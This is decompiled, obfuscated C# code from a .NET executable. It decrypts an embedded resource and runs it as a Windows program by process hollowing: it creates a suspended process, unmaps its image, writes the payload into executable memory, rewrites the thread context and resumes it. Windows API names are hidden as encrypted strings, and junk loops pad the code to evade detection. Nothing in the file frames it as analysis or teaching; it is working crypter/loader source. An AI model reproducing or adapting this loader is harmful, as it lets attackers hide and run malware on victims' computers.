using System;
using System.Diagnostics;
using System.IO;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using ns2;

namespace ns1;

[StandardModule]
internal sealed class Class6
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static uint uint_0;

	private static uint uint_1;

	static Class6()
	{
		Class1.smethod_11();
		uint_0 = 1069866078u;
		uint_1 = 1966638347u;
	}

	public static T smethod_0<T>(string string_0)
	{
		string text = ".#Qnw&o";
		int i = 0;
		checked
		{
			for (int num = PoweredByAttribute.Class7.smethod_0(text, 941, 919); i < num; i++)
			{
				Class1.smethod_6(text, i, 301, 371);
				byte b = 8;
				do
				{
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 102u);
			}
			ulong num2 = 3uL;
			do
			{
				num2++;
			}
			while (num2 <= 72L);
			byte b2 = 10;
			do
			{
				b2 = (byte)unchecked((uint)(b2 + 1));
			}
			while (unchecked((uint)b2) <= 125u);
			Class1.smethod_7(284, 368);
			return Conversions.ToGenericParameter<T>((object)Marshal.GetDelegateForFunctionPointer(Class1.GetProcAddress(Class1.GetModuleHandle(Class2.smethod_4(string_0, new char[1] { Convert.ToChar(58) }, 834, 789)[0]), string_0.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(T)));
		}
	}

	public static void smethod_1(byte[] byte_0, ushort ushort_0, ulong ulong_0, ushort ushort_1, short short_0)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 100);
			if (byte_0[60] == 128)
			{
				string text = " ]=5BA";
				int i = 0;
				for (int num2 = PoweredByAttribute.Class7.smethod_0(text, 564, 526); i < num2; i++)
				{
					Class1.smethod_6(text, i, 887, 809);
				}
				Thread thread = new Thread((ParameterizedThreadStart)Class1.smethod_4);
				thread.SetApartmentState(ApartmentState.STA);
				byte b = 0;
				do
				{
					for (int j = b; j <= 30 && j != 25; j++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				thread.Start(byte_0);
				return;
			}
			string string_ = PoweredByAttribute.smethod_0(PoweredByAttribute.Class7.smethod_2(326, 270), 131, 135);
			string string_2 = PoweredByAttribute.Class7.smethod_4(Class1.smethod_6(PoweredByAttribute.Class7.smethod_3(354, 376), 0, 405, 459), 350, 377);
			string string_3 = "yUH";
			string string_4 = "a7QlQrpz1VCPxH44hBBD9TzfCdTN";
			if (PoweredByAttribute.Class7.smethod_6(PoweredByAttribute.Class7.smethod_5(string_2, Class1.smethod_0(bool_1: true, string_3, string_4), 846, 774), 866, 793))
			{
				string text2 = "bqRD5";
				int k = 0;
				for (int num3 = PoweredByAttribute.Class7.smethod_0(text2, 14, 52); k < num3; k++)
				{
					Class1.smethod_6(text2, k, 727, 649);
				}
				string string_5 = PoweredByAttribute.Class7.smethod_4(Class1.smethod_6(PoweredByAttribute.Class7.smethod_3(415, 389), 0, 254, 160), 525, 554);
				string_3 = "VL-fUp3";
				string_4 = "a7QiWbtwyEaRuHU4iwdfpnvBRcyqfQW0M0K0ecJGjZZT";
				string[] directories = Directory.GetDirectories(PoweredByAttribute.Class7.smethod_5(string_5, Class1.smethod_0(bool_1: true, string_3, string_4), 101, 45));
				foreach (string text3 in directories)
				{
					string text4 = text3.ToLower();
					string_3 = "-cNq";
					string_4 = "J9pbAPs=";
					if (text4.Contains(Class1.smethod_0(bool_1: false, string_3, string_4)))
					{
						string_3 = "=,";
						string_4 = "DYsDRKdx1B+HnF0=";
						string_ = PoweredByAttribute.Class7.smethod_5(text3, Class1.smethod_0(bool_1: false, string_3, string_4), 416, 488);
						break;
					}
				}
			}
			byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num4 = Class1.smethod_3(60, byte_0);
			decimal num5 = new decimal(13L);
			decimal num6 = new decimal(40L);
			decimal num7 = num5;
			while (ForLoopControl.ForNextCheckDec(num7, num6, 1m))
			{
				num7 = decimal.Add(num7, 1m);
			}
			int num8 = PoweredByAttribute.smethod_3(byte_0, num4 + 6, 423, 388);
			IntPtr intptr_ = new IntPtr(Class1.smethod_3(num4 + 84, byte_0));
			IntPtr[] array3 = new IntPtr[4];
			string_3 = "gx6{_/Z~";
			string_4 = "Oo0HXrB4lAPYp0o0iQFVhWbIUoeXSxA=";
			IntPtr intPtr = default(IntPtr);
			if (!smethod_0<Delegate0>(Class1.smethod_0(bool_1: false, string_3, string_4))(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
			{
				return;
			}
			long num9 = 7L;
			do
			{
				num9++;
			}
			while (num9 <= 30L);
			try
			{
				uint[] array4 = new uint[179];
				array4[0] = 65538u;
				string_3 = "[SpM";
				string_4 = "Oo0HXrB4lAPYo10lvB1CsHXDco2KTDSQAQ==";
				if (smethod_0<Delegate1>(Class1.smethod_0(bool_1: true, string_3, string_4))(array3[1], array4))
				{
					string_3 = "2#;Y~";
					string_4 = "Oo0HXrB4lAPYtl0wjCVCunfCQpGpXTyHB0k=";
					Delegate2 @delegate = smethod_0<Delegate2>(Class1.smethod_0(bool_1: true, string_3, string_4));
					IntPtr intptr_2 = array3[0];
					IntPtr intptr_3 = new IntPtr(unchecked((long)array4[41]) + 8L);
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6))
					{
						string_3 = "9S_jCI";
						string_4 = "P5wRXLku6UW3ilUwmCNZsGPoV7GBWyWBGl4=";
						if (unchecked((long)smethod_0<Delegate3>(Class1.smethod_0(bool_1: true, string_3, string_4))(array3[0], intptr_5)) == 0L)
						{
							string_3 = "mx@)!d";
							string_4 = "Oo0HXrB4lAPYslEjnABRuVXLXY2HfSk=";
							Delegate4 delegate2 = smethod_0<Delegate4>(Class1.smethod_0(bool_1: false, string_3, string_4));
							IntPtr intptr_7 = array3[0];
							IntPtr intPtr2 = new IntPtr(Class1.smethod_3(num4 + 52, byte_0));
							IntPtr intptr_8 = intPtr2;
							IntPtr intptr_9 = new IntPtr(Class1.smethod_3(num4 + 80, byte_0));
							IntPtr intptr_10 = delegate2(intptr_7, intptr_8, intptr_9, 12288, 64);
							string_3 = "qzBJ";
							string_4 = "Oo0HXrB4lAPYs0o4nBBgp3vEVJGXdTSFGkKs";
							Delegate5 delegate3 = smethod_0<Delegate5>(Class1.smethod_0(bool_1: false, string_3, string_4));
							delegate3(array3[0], intptr_10, byte_0, intptr_, ref intptr_6);
							int[] array5 = new int[10];
							int num10 = num8 - 1;
							for (int m = 0; m <= num10; m++)
							{
								array5[0] = 13;
								array5[5] = 255 + array5[0];
								Buffer.BlockCopy(byte_0, num4 + 248 + m * 40, array5, 0, 40);
								byte[] array6 = new byte[array5[4] - 1 + 1];
								Buffer.BlockCopy(byte_0, array5[5], array6, 0, array6.Length);
								array5.Length.ToString();
								IntPtr intptr_11 = array3[0];
								intptr_9 = new IntPtr(PoweredByAttribute.smethod_4(ref intptr_10, 539, 590) + array5[3]);
								IntPtr intptr_12 = intptr_9;
								intPtr2 = new IntPtr(array6.Length);
								delegate3(intptr_11, intptr_12, array6, intPtr2, ref intptr_6);
							}
							IntPtr intptr_13 = array3[0];
							intptr_9 = new IntPtr(unchecked((long)array4[41]) + 8L);
							IntPtr intptr_14 = intptr_9;
							byte[] byte_ = Class1.smethod_2(intptr_10.ToInt32());
							intPtr2 = new IntPtr(4);
							delegate3(intptr_13, intptr_14, byte_, intPtr2, ref intptr_6);
							array4[44] = (uint)(intptr_10.ToInt32() + Class1.smethod_3(num4 + 40, byte_0));
							string_3 = "E?tsy4z#es";
							string_4 = "Oo0HXrB4lAPYt10lvB1CsHXDco2KTDSQAQ==";
							smethod_0<Delegate1>(Class1.smethod_0(bool_1: false, string_3, string_4))(array3[1], array4);
							smethod_0<Delegate6>(Class1.smethod_0(bool_1: false, (string)null, "Oo0HXrB4lAPYtl0inRhVgXzVVIOA"))(array3[1]);
							return;
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.GetProcessById(array3[2].ToInt32()).Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		Class1.smethod_11();
		int try0005_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		decimal num5 = default(decimal);
		ResourceManager resourceManager = default(ResourceManager);
		int num6 = default(int);
		long num7 = default(long);
		bool flag = default(bool);
		decimal num9 = default(decimal);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				decimal num8;
				switch (try0005_dispatch)
				{
				default:
					Class2.smethod_5(794, 815);
					num3 = -2;
					goto IL_0017;
				case 312:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0005;
							case 1:
								break;
							case 0:
								goto end_IL_0005;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0017;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_0020;
						case 6:
							goto IL_0029;
						case 7:
							goto IL_0046;
						case 5:
							goto IL_0054;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_0067;
						case 10:
							goto IL_008b;
						case 11:
							goto IL_00a9;
						case 12:
						case 13:
							goto IL_00af;
						case 14:
							goto end_IL_0005_2;
						default:
							goto end_IL_0005;
						case 0:
							goto end_IL_0005;
						case 15:
							goto end_IL_0005_3;
						}
						goto default;
					}
					IL_008b:
					num = 10;
					num5 = decimal.Add(num5, 1m);
					goto IL_009a;
					IL_00af:
					num = 13;
					resourceManager = new ResourceManager("z4ig21h0", PoweredByAttribute.Class7.smethod_2(869, 812));
					break;
					IL_0017:
					num = 2;
					Class1.smethod_1();
					goto IL_001e;
					IL_001e:
					num = 3;
					goto IL_0020;
					IL_0020:
					num = 4;
					num6 = 9;
					goto IL_0054;
					IL_0054:
					num = 5;
					num7 = 3L;
					goto IL_0029;
					IL_0029:
					do
					{
						num = 6;
						num7 = checked(num7 + 1L);
					}
					while (num7 <= 111L);
					goto IL_0046;
					IL_0046:
					num = 7;
					num6 = checked(num6 + 1);
					if (num6 <= 64)
					{
						goto IL_0054;
					}
					goto IL_0063;
					IL_0063:
					num = 8;
					flag = true;
					goto IL_0067;
					IL_0067:
					num = 9;
					num8 = new decimal(7L);
					num9 = new decimal(39L);
					num5 = num8;
					goto IL_009a;
					IL_009a:
					if (ForLoopControl.ForNextCheckDec(num5, num9, 1m))
					{
						goto IL_008b;
					}
					goto IL_00a9;
					IL_00a9:
					num = 11;
					if (flag)
					{
					}
					goto IL_00af;
					end_IL_0005_2:
					break;
				}
				num = 14;
				ResourceManager resourceManager_ = resourceManager;
				string string_ = ")-{T\\&!";
				string string_2 = "OIkNALNx1AM=";
				smethod_1(Class1.smethod_5((ushort)6117, 0.0, (byte[])PoweredByAttribute.Class7.smethod_7(resourceManager_, Class1.smethod_0(bool_1: false, string_, string_2), 186, 237)), 8040, 1822891455uL, 25904, 4305);
				break;
				end_IL_0005:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0005_dispatch = 312;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0005_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
